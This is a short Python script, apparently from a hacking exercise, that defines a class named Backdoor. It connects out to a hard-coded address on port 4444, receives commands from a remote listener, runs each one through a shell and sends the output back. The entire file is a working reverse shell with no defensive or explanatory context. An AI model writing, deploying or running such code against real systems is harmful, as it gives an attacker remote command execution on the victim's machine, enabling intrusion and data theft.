import socket
import subprocess


class Backdoor:
    # Set socket
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a instance of the socket
        self.connection.connect((ip, port))

    # Execute a command and return its output
    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    # Start the connection to the listener
    def run(self):
        while True:
            command = self.connection.recv(1024)
            command_result = self.execute_system_command(command)
            self.connection.send(command_result)
        self.connection.close


my_backdoor = Backdoor("192.168.190.140", 4444)
my_backdoor.run()
